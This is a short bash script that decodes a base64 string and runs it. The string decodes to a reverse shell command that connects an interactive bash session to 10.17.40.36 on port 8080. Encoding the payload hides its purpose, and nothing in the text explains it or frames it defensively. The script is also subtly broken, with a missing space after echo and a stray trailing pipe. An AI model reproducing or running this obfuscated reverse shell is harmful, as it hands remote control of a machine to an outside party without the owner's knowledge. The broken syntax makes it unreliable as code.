#!/usr/bin/env bash
encoded='YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy40MC4zNi84MDgwIDA+JjE='
decoded=$(echo"$encoded" | base64 -d)
bash -c "$decoded"|
